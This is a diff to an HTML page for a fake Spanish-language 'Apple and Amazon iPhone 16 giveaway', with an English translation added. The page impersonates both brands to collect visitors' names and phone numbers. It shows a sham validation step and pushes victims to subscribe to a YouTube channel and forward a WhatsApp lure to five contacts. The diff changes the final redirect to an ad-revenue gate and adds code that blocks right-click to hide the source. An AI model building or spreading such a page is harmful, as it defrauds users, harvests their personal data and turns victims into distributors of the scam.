@@ -1,9 +1,4 @@
-<html>
-  
-  <head>
-
-
-<base href="https://apple-amazon-iphone16-giveaway.com/">
+<html><head><base href="https://www.youtube.com/channel/UCiUmnLJrGZZhyo20sU4ZwiQ">
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <meta name="description" content="Participa en exclusivo de Apple y Amazon para ganar uno de los 3 iPhone 16 gratis. Celebra el lanzamiento con nosotros y multiplica tus oportunidades de ganar.">
@@ -64,7 +59,7 @@ body {
 
 .container::after {
   content: "";
-  position: absolute;
+
   bottom: -50px;
   right: -50px;
   width: 100px;
@@ -372,7 +367,6 @@ button:active {
   }
 }
 </style>
-
 </head>
 <body>
 <div class="container">
@@ -381,19 +375,19 @@ button:active {
       <img src="https://i.imgur.com/SbHPIYP.png" alt="Logo de Apple" width="40" height="40">
       <img src="https://i.imgur.com/rTyTaIi.png" alt="Logo de Amazon" width="60" height="30">
     </div>
-    <h1>¡Celebra el Lanzamiento del iPhone 16!</h1>
+    <h1 id="mainTitle">¡Celebra el Lanzamento del iPhone 16!</h1>
   </header>
   
   <div class="offer">
-    <h2>¡Gana 1 de 3 iPhone 16 Gratis!</h2>
+    <h2 id="offerTitle">¡Gana 1 de 3 iPhone 16 Gratis!</h2>
     <img class="product-image" src="https://i.imgur.com/6UeRKRP.png" alt="iPhone 16" width="300" height="200">
     <p id="offer-description" class="offer-text">
-  <span style="color: #FF9900; font-weight: bold;">¡Increíble oportunidad!</span><br> Apple y Amazon se han unido en una colaboración sin precedentes para celebrar el lanzamiento del revolucionario iPhone 16. Sé uno de los 3 afortunados en obtener este dispositivo de última generación antes que nadie y completamente gratis. ¡Una oportunidad única en la vida!
+  <span style="color: #FF9900; font-weight: bold;" id="amazingOpportunity">¡Increíble oportunidad!</span><br> <span id="offerDescription">Apple y Amazon se han unido en una colaboración sin precedentes para celebrar el lanzamiento del revolucionario iPhone 16. Sé uno de los 3 afortunados en obtener este dispositivo de última generación antes que nadie y completamente gratis. ¡Una oportunidad única en la vida!</span>
 </p>
   </div>
   
   <div id="application-form">
-    <h2>Aplica para ganar un iPhone 16</h2>
+    <h2 id="applyTitle">Aplica para ganar un iPhone 16</h2>
     <form id="entry-form">
       <input type="text" id="full-name" placeholder="Nombre Completo" required>
       <input type="tel" id="phone-number" placeholder="Número Telefónico" required>
@@ -441,12 +435,12 @@ button:active {
 <option >🇻🇪 Venezuela</option>
 
       </datalist>
-      <button type="submit">Aplicar</button>
+      <button type="submit" id="applyButton">Aplicar</button>
     </form>
   </div>
 
   <div id="validation-animation" style="display: none;">
-    <p>Validando tus datos...</p>
+    <p id="validatingData">Validando tus datos...</p>
     <div class="spinner"></div>
   </div>
   
@@ -455,19 +449,19 @@ button:active {
       <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
       <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
     </svg>
-    <p>Información válida</p>
+    <p id="validInfo">Información válida</p>
   </div>
 
   <div id="thank-you-page" style="display: none;">
-    <h2>¡Gracias por tu participación!</h2>
-    <p>Para completar tu participación, sigue estos pasos:</p>
+    <h2 id="thankYouTitle">¡Gracias por tu participación!</h2>
+    <p id="followSteps">Para completar tu participación, sigue estos pasos:</p>
     <ol>
       <li>
-        Suscríbete a nuestro canal de YouTube:
-        <a href="https://www.youtube.com/channel/UCiUmnLJrGZZhyo20sU4ZwiQ" id="youtube-subscribe" target="_blank">Suscribirse a YouTube</a>
+        <span id="subscribeYouTube">Suscríbete a nuestro canal de YouTube:</span>
+        <a href="https://www.youtube.com/channel/UCiUmnLJrGZZhyo20sU4ZwiQ" id="youtube-subscribe">Suscribirse a YouTube</a>
       </li>
       <li>
-        Comparte esta oportunidad con 5 amigos o familiares:
+        <span id="shareOpportunity">Comparte esta oportunidad con 5 amigos o familiares:</span>
         <button id="share-whatsapp">Compartir en WhatsApp</button>
         <p id="share-counter">Compartido: 0/5</p>
       </li>
@@ -475,14 +469,109 @@ button:active {
   </div>
 
   <div id="final-message" style="display: none;">
-    <p>Nos comunicaremos contigo por la vía correspondiente si eres elegido. Los ganadores también serán publicados en nuestro canal de YouTube.</p>
+    <p id="contactMessage">Nos comunicaremos contigo por la vía correspondiente si eres elegido. Los ganadores también serán publicados en nuestro canal de YouTube.</p>
     <button id="accept-button">Aceptar</button>
   </div>
 </div>
 
 <script>
+// Función para detectar el idioma del navegador
+function getNavigatorLanguage() {
+  if (navigator.languages && navigator.languages.length) {
+    return navigator.languages[0].slice(0, 2);
+  } else {
+    return (navigator.userLanguage || navigator.language || navigator.browserLanguage || 'es').slice(0, 2);
+  }
+}
+
+// Función para traducir el contenido
+function translateContent() {
+  const lang = getNavigatorLanguage();
+  
+  const translations = {
+    en: {
+      mainTitle: "Celebrate the Launch of iPhone 16!",
+      offerTitle: "Win 1 of 3 Free iPhone 16!",
+      amazingOpportunity: "Amazing opportunity!",
+      offerDescription: "Apple and Amazon have joined forces in an unprecedented collaboration to celebrate the launch of the revolutionary iPhone 16. Be one of the 3 lucky ones to get this cutting-edge device before anyone else and completely free. A once-in-a-lifetime opportunity!",
+      applyTitle: "Apply to win an iPhone 16",
+      fullName: "Full Name",
+      phoneNumber: "Phone Number",
+      enterCountry: "Enter your country",
+      applyButton: "Apply",
+      validatingData: "Validating your data...",
+      validInfo: "Valid information",
+      thankYouTitle: "Thank you for your participation!",
+      followSteps: "To complete your participation, follow these steps:",
+      subscribeYouTube: "Subscribe to our YouTube channel:",
+      shareOpportunity: "Share this opportunity with 5 friends or family members:",
+      contactMessage: "We will contact you through the corresponding means if you are chosen. Winners will also be published on our YouTube channel.",
+      acceptButton: "Accept",
+      shareMessage: "🎉🍎 *INCREDIBLE NEWS!* 📱💥 Apple and Amazon have joined forces to celebrate the launch of the *iPhone 16* in a spectacular way. 🎁🏆\n\n🔥 They're giving away *3 iPhone 16 COMPLETELY FREE*. Yes, you read that right, FREE! 🆓\n\n🤩 I've participated and want to share this opportunity with you. It's quick, easy, and you could be one of the lucky winners. 🍀\n\n🔗 *Don't waste time, participate now*: https://iphone16promax.github.io/amazon/\n\n⏰ The offer is for a limited time. *Spread the word and may luck be on your side!* 🚀🌟",
+      youtubeSubscribe: "Subscribe to YouTube",
+      shareWhatsApp: "Share on WhatsApp"
+    },
+    es: {
+      mainTitle: "¡Celebra el Lanzamiento del iPhone 16!",
+      offerTitle: "¡Gana 1 de 3 iPhone 16 Gratis!",
+      amazingOpportunity: "¡Increíble oportunidad!",
+      offerDescription: "Apple y Amazon se han unido en una colaboración sin precedentes para celebrar el lanzamiento del revolucionario iPhone 16. Sé uno de los 3 afortunados en obtener este dispositivo de última generación antes que nadie y completamente gratis. ¡Una oportunidad única en la vida!",
+      applyTitle: "Aplica para ganar un iPhone 16",
+      fullName: "Nombre Completo",
+      phoneNumber: "Número Telefónico",
+      enterCountry: "Escribe tu país",
+      applyButton: "Aplicar",
+      validatingData: "Validando tus datos...",
+      validInfo: "Información válida",
+      thankYouTitle: "¡Gracias por tu participación!",
+      followSteps: "Para completar tu participación, sigue estos pasos:",
+      subscribeYouTube: "Suscríbete a nuestro canal de YouTube:",
+      shareOpportunity: "Comparte esta oportunidad con 5 amigos o familiares:",
+      contactMessage: "Nos comunicaremos contigo por la vía correspondiente si eres elegido. Los ganadores también serán publicados en nuestro canal de YouTube.",
+      acceptButton: "Aceptar",
+      shareMessage: "🎉🍎 *¡INCREÍBLE NOTICIA!* 📱💥 Apple y Amazon se han unido para celebrar el lanzamiento del *iPhone 16* de una manera espectacular. 🎁🏆\n\n🔥 Están regalando *3 iPhone 16 totalmente GRATIS*. Sí, lo leíste bien, ¡GRATIS! 🆓\n\n🤩 He participado y quiero compartir esta oportunidad contigo. Es rápido, fácil y podrías ser uno de los afortunados ganadores. 🍀\n\n🔗 *No pierdas tiempo, participa ahora*: https://iphone16promax.github.io/amazon/\n\n⏰ La oferta es por tiempo limitado. *¡Corre la voz y que la suerte esté de tu lado!* 🚀🌟",
+      youtubeSubscribe: "Suscribirse a YouTube",
+      shareWhatsApp: "Compartir en WhatsApp"
+    }
+  };
+
+  const currentTranslation = translations[lang] || translations['es'];
+
+  document.getElementById('mainTitle').textContent = currentTranslation.mainTitle;
+  document.getElementById('offerTitle').textContent = currentTranslation.offerTitle;
+  document.getElementById('amazingOpportunity').textContent = currentTranslation.amazingOpportunity;
+  document.getElementById('offerDescription').textContent = currentTranslation.offerDescription;
+  document.getElementById('applyTitle').textContent = currentTranslation.applyTitle;
+  document.getElementById('full-name').placeholder = currentTranslation.fullName;
+  document.getElementById('phone-number').placeholder = currentTranslation.phoneNumber;
+  document.getElementById('country').placeholder = currentTranslation.enterCountry;
+  document.getElementById('applyButton').textContent = currentTranslation.applyButton;
+  document.getElementById('validatingData').textContent = currentTranslation.validatingData;
+  document.getElementById('validInfo').textContent = currentTranslation.validInfo;
+  document.getElementById('thankYouTitle').textContent = currentTranslation.thankYouTitle;
+  document.getElementById('followSteps').textContent = currentTranslation.followSteps;
+  document.getElementById('subscribeYouTube').textContent = currentTranslation.subscribeYouTube;
+  document.getElementById('shareOpportunity').textContent = currentTranslation.shareOpportunity;
+  document.getElementById('contactMessage').textContent = currentTranslation.contactMessage;
+  document.getElementById('accept-button').textContent = currentTranslation.acceptButton;
+  document.getElementById('youtube-subscribe').textContent = currentTranslation.youtubeSubscribe;
+  document.getElementById('share-whatsapp').textContent = currentTranslation.shareWhatsApp;
+
+  window.currentLang = lang;
+  window.currentTranslation = currentTranslation;
+}
+
+// Call translateContent immediately when the script runs
+translateContent();
+
+// Also call translateContent when the window loads (in case any dynamic content needs translation)
+window.onload = function() {
+  translateContent();
+};
+
 document.getElementById('entry-form').addEventListener('submit', function(e) {
   e.preventDefault();
+  translateContent(); // Ensure content is translated when form is submitted
   document.getElementById('application-form').style.display = 'none';
   document.getElementById('validation-animation').style.display = 'block';
   
@@ -501,9 +590,10 @@ document.getElementById('entry-form').addEventListener('submit', function(e) {
 });
 let shareCount = 0;
 
-document.getElementById('share-whatsapp').addEventListener('click', function() {
-  const message = encodeURIComponent("🎉🍎 *¡INCREÍBLE NOTICIA!* 📱💥 Apple y Amazon se han unido para celebrar el lanzamiento del *iPhone 16* de una manera espectacular. 🎁🏆\n\n🔥 Están regalando *3 iPhone 16 totalmente GRATIS*. Sí, lo leíste bien, ¡GRATIS! 🆓\n\n🤩 He participado y quiero compartir esta oportunidad contigo. Es rápido, fácil y podrías ser uno de los afortunados ganadores. 🍀\n\n🔗 *No pierdas tiempo, participa ahora*: https://iphone16promax.github.io/amazon/\n\n⏰ La oferta es por tiempo limitado. *¡Corre la voz y que la suerte esté de tu lado!* 🚀🌟");
-  window.open(`https://wa.me/?text=${message}`, '_blank');
+document.getElementById('share-whatsapp').addEventListener('click', function(e) {
+  e.preventDefault(); // Prevent default action
+  const message = encodeURIComponent(window.currentTranslation.shareMessage);
+  window.open(`whatsapp://send?text=${message}`, '_self');
   shareCount++;
   document.getElementById('share-counter').textContent = `Compartido: ${shareCount}/5`;
   
@@ -514,13 +604,14 @@ document.getElementById('share-whatsapp').addEventListener('click', function() {
 });
 
 document.getElementById('accept-button').addEventListener('click', function() {
-  window.location.href = 'https://www.google.com';
+  translateContent();
+  window.location.href = 'https://www.cpmrevenuegate.com/y7hxjdikp?key=6b874e7069b56e046e01ef5b86695480';
 });
 
 // YouTube subscribe button functionality
 document.getElementById('youtube-subscribe').addEventListener('click', function(e) {
   e.preventDefault();
-  window.open(this.href, '_blank');
+  window.location.href = this.href;
 });
 
 document.getElementById('country').addEventListener('input', function() {
@@ -536,7 +627,7 @@ document.getElementById('country').addEventListener('input', function() {
   }
 });
 </script>
-  
+
 <script type="text/javascript">
         // Deshabilitar el clic derecho
         document.addEventListener("contextmenu", function(event) {
@@ -582,12 +673,11 @@ document.getElementById('country').addEventListener('input', function() {
             document.getElementById("contenido").innerHTML = "Este contenido fue cargado dinámicamente para proteger el código HTML.";
         }
     </script>  
-  
+
   
   <div style="visibility:hidden">
 <center><script id="_wau47u">var _wau = _wau || []; _wau.push(["dynamic", "nico01", "47u", "c4302bffffff", "small"]);</script><script async src="//waust.at/d.js"></script></center>
 </div><script></script>
 
-  
   
 </body></html>
